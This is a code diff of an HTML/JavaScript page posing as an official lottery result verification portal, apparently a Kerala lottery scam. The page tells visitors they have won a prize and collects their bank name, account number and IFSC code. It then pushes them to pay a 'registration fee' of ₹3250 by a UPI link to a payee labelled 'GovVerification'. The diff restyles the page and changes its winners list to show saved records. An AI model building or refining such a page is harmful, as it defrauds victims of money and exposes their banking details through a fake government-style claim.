@@ -5,37 +5,267 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Official Customer Result Verification Portal</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
-    body { background: #070d24; color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 12px; }
-    .support-bar { width: 100%; max-width: 440px; background: #121c3b; border: 1px solid #ffcc00; border-radius: 10px; padding: 10px 14px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
-    .support-label { font-size: 11px; color: #ffcc00; font-weight: bold; }
-    .support-num { font-size: 15px; font-weight: bold; color: #fff; text-decoration: none; }
-    .call-btn { background: #22c55e; color: #fff; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; text-decoration: none; }
-    .header { text-align: center; margin-bottom: 15px; }
-    .header h1 { font-size: 18px; color: #ffcc00; margin-top: 5px; }
-    .header p { color: #8c9fc2; font-size: 12px; }
-    .card { width: 100%; max-width: 440px; background: #101a38; border: 1px solid rgba(255,204,0,0.3); border-radius: 12px; padding: 18px; }
-    label { display: block; color: #ccd9f0; font-size: 12px; margin-bottom: 5px; font-weight: bold; }
-    input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2e4374; background: #070d22; color: #fff; font-size: 14px; margin-bottom: 12px; outline: none; }
-    .check-btn { width: 100%; background: #ffcc00; color: #000; font-weight: bold; border: none; padding: 12px; border-radius: 8px; font-size: 15px; cursor: pointer; }
-    #statusMsg { text-align: center; margin-top: 10px; font-size: 13px; font-weight: bold; }
-    #resultBox { display: none; margin-top: 15px; border-top: 1px dashed rgba(255,255,255,0.2); padding-top: 15px; }
-    .winner-status { text-align: center; background: rgba(40,167,69,0.2); border: 1px solid #28a745; color: #4ade80; padding: 6px; border-radius: 6px; font-size: 12px; font-weight: bold; margin-bottom: 10px; }
-    .prize-highlight { text-align: center; background: #16224a; border: 1px solid #ffcc00; border-radius: 8px; padding: 10px; margin-bottom: 10px; }
-    .prize-title { color: #ffcc00; font-size: 12px; text-transform: uppercase; }
-    .prize-amount { font-size: 22px; font-weight: bold; color: #fff; }
-    .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.08); font-size: 13px; }
-    .withdraw-box { background: #0c1530; border: 1px solid #23345d; border-radius: 8px; padding: 12px; margin-top: 12px; }
-    .withdraw-box h3 { font-size: 13px; color: #ffcc00; margin-bottom: 10px; }
-    .withdraw-box input { margin-bottom: 8px; padding: 9px; font-size: 13px; }
-    .fee-notice { background: rgba(255,204,0,0.1); border: 1px solid #ffcc00; border-radius: 6px; padding: 8px 10px; margin: 10px 0; display: flex; justify-content: space-between; font-size: 12px; }
-    .pay-btn { display: block; width: 100%; background: #22c55e; color: #fff; text-decoration: none; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; text-align: center; }
-    .winner-board { margin-top: 20px; background: #0c1530; border: 1px solid #1c2b52; border-radius: 10px; padding: 12px; }
-    .winner-board-title { font-size: 12px; font-weight: bold; color: #ffcc00; display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #1c2b52; padding-bottom: 6px; }
-    .winner-item { display: flex; align-items: center; justify-content: space-between; padding: 6px 0; font-size: 11.5px; border-bottom: 1px dashed rgba(255,255,255,0.06); }
-    .rank-tag { width: 20px; height: 20px; background: #182852; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; color: #ffcc00; margin-right: 6px; }
-    .prize-level-badge { font-size: 9px; background: #1c2e59; color: #93c5fd; padding: 2px 5px; border-radius: 4px; margin-left: 4px; }
-    .prize-tag { color: #4ade80; font-weight: bold; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      background: #070d24;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 15px 12px;
+    }
+    .support-bar {
+      width: 100%;
+      max-width: 440px;
+      background: #121c3b;
+      border: 1px solid #ffcc00;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .support-label {
+      font-size: 11px;
+      color: #ffcc00;
+      font-weight: bold;
+    }
+    .support-num {
+      font-size: 15px;
+      font-weight: bold;
+      color: #fff;
+      text-decoration: none;
+    }
+    .call-btn {
+      background: #22c55e;
+      color: #fff;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .header h1 {
+      font-size: 18px;
+      color: #ffcc00;
+      margin-top: 5px;
+    }
+    .header p {
+      color: #8c9fc2;
+      font-size: 12px;
+    }
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: #101a38;
+      border: 1px solid rgba(255,204,0,0.3);
+      border-radius: 12px;
+      padding: 18px;
+    }
+    label {
+      display: block;
+      color: #ccd9f0;
+      font-size: 12px;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #2e4374;
+      background: #070d22;
+      color: #fff;
+      font-size: 14px;
+      margin-bottom: 12px;
+      outline: none;
+    }
+    .check-btn {
+      width: 100%;
+      background: #ffcc00;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    #statusMsg {
+      text-align: center;
+      margin-top: 10px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+    #resultBox {
+      display: none;
+      margin-top: 15px;
+      border-top: 1px dashed rgba(255,255,255,0.2);
+      padding-top: 15px;
+    }
+    .winner-status {
+      text-align: center;
+      background: rgba(40,167,69,0.2);
+      border: 1px solid #28a745;
+      color: #4ade80;
+      padding: 6px;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .prize-highlight {
+      text-align: center;
+      background: #16224a;
+      border: 1px solid #ffcc00;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    .prize-title {
+      color: #ffcc00;
+      font-size: 12px;
+      text-transform: uppercase;
+    }
+    .prize-amount {
+      font-size: 22px;
+      font-weight: bold;
+      color: #fff;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+      font-size: 13px;
+    }
+    .withdraw-box {
+      background: #0c1530;
+      border: 1px solid #23345d;
+      border-radius: 8px;
+      padding: 12px;
+      margin-top: 12px;
+    }
+    .withdraw-box h3 {
+      font-size: 13px;
+      color: #ffcc00;
+      margin-bottom: 10px;
+    }
+    .withdraw-box input {
+      margin-bottom: 8px;
+      padding: 9px;
+      font-size: 13px;
+    }
+    .fee-notice {
+      background: rgba(255,204,0,0.1);
+      border: 1px solid #ffcc00;
+      border-radius: 6px;
+      padding: 8px 10px;
+      margin: 10px 0;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+    }
+    .pay-btn {
+      display: block;
+      width: 100%;
+      background: #22c55e;
+      color: #fff;
+      text-decoration: none;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 14px;
+      text-align: center;
+    }
+    .winner-board {
+      margin-top: 20px;
+      background: #0c1530;
+      border: 1px solid #1c2b52;
+      border-radius: 10px;
+      padding: 12px;
+    }
+    .winner-board-title {
+      font-size: 12px;
+      font-weight: bold;
+      color: #ffcc00;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+      border-bottom: 1px solid #1c2b52;
+      padding-bottom: 6px;
+    }
+    .winner-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 6px;
+      font-size: 12px;
+      border-bottom: 1px dashed rgba(255,255,255,0.08);
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background 0.2s;
+    }
+    .winner-item:hover {
+      background: rgba(255, 255, 255, 0.04);
+    }
+    .rank-tag {
+      width: 22px;
+      height: 22px;
+      background: #182852;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      font-weight: bold;
+      color: #ffcc00;
+      margin-right: 8px;
+      flex-shrink: 0;
+    }
+    .prize-level-badge {
+      font-size: 10px;
+      background: #1c2e59;
+      color: #93c5fd;
+      padding: 2px 6px;
+      border-radius: 4px;
+      margin-left: 6px;
+      display: inline-block;
+    }
+    .prize-tag {
+      color: #4ade80;
+      font-weight: bold;
+      font-size: 12px;
+    }
+    .select-btn {
+      background: #22c55e;
+      color: #ffffff;
+      border: none;
+      border-radius: 6px;
+      padding: 4px 8px;
+      font-size: 11px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-left: 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 3px;
+    }
+    .select-btn:hover {
+      background: #16a34a;
+    }
   </style>
 </head>
 <body>
@@ -76,19 +306,18 @@
         <input type="text" id="bankName" placeholder="Bank Name (e.g. SBI)">
         <input type="number" id="accNumber" placeholder="Account Number">
         <input type="text" id="ifscCode" placeholder="IFSC Code" style="text-transform: uppercase;">
-
         <div class="fee-notice">
           <span>Registration Fees:</span>
           <strong id="resFee" style="color: #ffcc00;">₹0</strong>
         </div>
-
         <a id="payLink" class="pay-btn" href="javascript:void(0)" onclick="handleWithdrawPayment()">Pay Registration Fee & Claim</a>
       </div>
     </div>
 
+    <!-- RECENT CUSTOMER CHECKED / SAVED LIST -->
     <div class="winner-board">
       <div class="winner-board-title">
-        <span>🏆 TODAY'S TOP 10 WINNING TICKETS</span>
+        <span>🏆 RECENT CHECKED & SAVED TICKETS</span>
         <span style="color: #22c55e;">● LIVE</span>
       </div>
       <div id="winnerListContainer"></div>
@@ -99,51 +328,64 @@
     const API_URL = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
     let currentFee = "3250";
     let currentUpi = "keralaLottery@paytm";
+    let cachedRecords = [];
 
-    const prizeData = [
-      { rank: "1st Prize", prize: "₹25,00,00,000", count: "1 Winner" },
-      { rank: "2nd Prize", prize: "₹10,00,00,000", count: "1 Winner" },
-      { rank: "3rd Prize", prize: "₹75,00,000", count: "1 Winner" },
-      { rank: "4th Prize", prize: "₹25,00,000", count: "12 Winners" },
-      { rank: "5th Prize", prize: "₹12,00,000", count: "16 Winners" },
-      { rank: "6th Prize", prize: "₹1,00,000", count: "36 Winners" },
-      { rank: "7th Prize", prize: "₹75,000", count: "99 Winners" },
-      { rank: "8th Prize", prize: "₹25,000", count: "120 Winners" },
-      { rank: "9th Prize", prize: "₹10,000", count: "179 Winners" },
-      { rank: "10th Prize", prize: "₹2,500", count: "200 Winners" }
-    ];
-
+    // Panel se saved tickets load karega aur list banayega
     async function loadWinnerBoard() {
       const container = document.getElementById("winnerListContainer");
-      const series = ["KL", "WB", "SK", "DL", "PB", "MH", "RJ", "KA", "GJ", "TN"];
-      let savedRecords = [];
       try {
         const res = await fetch(API_URL);
-        savedRecords = await res.json();
+        cachedRecords = await res.json();
       } catch (e) {
-        savedRecords = [];
+        cachedRecords = [];
+      }
+
+      renderWinnerBoard();
+    }
+
+    // List render karne ka function
+    function renderWinnerBoard() {
+      const container = document.getElementById("winnerListContainer");
+
+      if (!cachedRecords || cachedRecords.length === 0) {
+        container.innerHTML = '<div style="text-align:center; padding:12px; color:#8c9fc2; font-size:12px;">Abhi koi saved ticket record uplabdh nahi hai.</div>';
+        return;
       }
 
       let html = "";
-      for (let i = 0; i < 10; i++) {
-        let ticketNum = "";
-        let levelName = prizeData[i].rank;
-        const match = savedRecords.find(item => item.prize && item.prize.toLowerCase().includes((i + 1).toString()));
-        if (match && match.ticket) {
-          ticketNum = match.ticket;
-        } else if (savedRecords[i] && savedRecords[i].ticket) {
-          ticketNum = savedRecords[i].ticket;
-        } else {
-          ticketNum = series[i] + " " + Math.floor(100000 + Math.random() * 900000);
-        }
+      cachedRecords.forEach((item, index) => {
+        const ticketNo = item.ticket ? item.ticket.trim() : "N/A";
+        const prizeRank = item.prize || "Prize Winner";
+        const amount = item.amount || "₹0";
 
-        html += '<div class="winner-item"><div><span class="rank-tag">' + (i + 1) + '</span><span>' + ticketNum + '</span><span class="prize-level-badge">' + levelName + '</span></div><div style="text-align:right;"><span class="prize-tag">' + prizeData[i].prize + '</span><br><span style="color:#718096;font-size:9px;">' + prizeData[i].count + '</span></div></div>';
-      }
+        html += `
+          <div class="winner-item" onclick="autoSelectTicket('${ticketNo}')">
+            <div style="display:flex; align-items:center; overflow:hidden;">
+              <span class="rank-tag">${index + 1}</span>
+              <strong style="color:#fff; font-size:12px;">${ticketNo}</strong>
+              <span class="prize-level-badge">${prizeRank}</span>
+            </div>
+            <div style="display:flex; align-items:center; flex-shrink:0;">
+              <span class="prize-tag">${amount}</span>
+              <button type="button" class="select-btn" onclick="event.stopPropagation(); autoSelectTicket('${ticketNo}')">✓ Check</button>
+            </div>
+          </div>
+        `;
+      });
+
       container.innerHTML = html;
     }
 
-    loadWinnerBoard();
+    // Ticket ko box me daal kar automatic select aur open karne ka function
+    function autoSelectTicket(ticketNo) {
+      if (!ticketNo || ticketNo === "N/A") return;
+      const input = document.getElementById("searchInput");
+      input.value = ticketNo;
+      verifyTicket();
+      input.scrollIntoView({ behavior: "smooth", block: "center" });
+    }
 
+    // Check status function
     async function verifyTicket() {
       const query = document.getElementById("searchInput").value.trim().toLowerCase();
       const status = document.getElementById("statusMsg");
@@ -163,6 +405,7 @@
       try {
         const response = await fetch(API_URL);
         const data = await response.json();
+        cachedRecords = data; // Cache update
 
         const item = data.find(r => 
           (r.ticket && r.ticket.trim().toLowerCase() === query) ||
@@ -176,11 +419,22 @@
           document.getElementById("resName").textContent = item.name || "-";
           document.getElementById("resTicket").textContent = item.ticket || "-";
           document.getElementById("resMobile").textContent = item.mobile ? item.mobile.replace(/.(?=.{4})/g, '*') : "-";
+          
           currentFee = item.fee || "3250";
           currentUpi = item.upiId || "keralaLottery@paytm";
           document.getElementById("resFee").textContent = "₹" + currentFee;
           document.getElementById("accHolderName").value = item.name || "";
+          
           box.style.display = "block";
+
+          // Naya checked item list me sabse upar dikhe
+          const alreadyIndex = cachedRecords.findIndex(r => r.ticket === item.ticket);
+          if (alreadyIndex > -1) {
+            cachedRecords.splice(alreadyIndex, 1);
+          }
+          cachedRecords.unshift(item);
+          renderWinnerBoard();
+
         } else {
           status.style.color = "#f87171";
           status.textContent = "Koi record nahi mila. Number dobara check karein.";
@@ -205,6 +459,9 @@
       const upiUrl = "upi://pay?pa=" + encodeURIComponent(currentUpi) + "&pn=GovVerification&am=" + currentFee + "&cu=INR&tn=RegistrationFee";
       window.location.href = upiUrl;
     }
+
+    // Page load hone par run karein
+    loadWinnerBoard();
   </script>
 </body>
 </html>
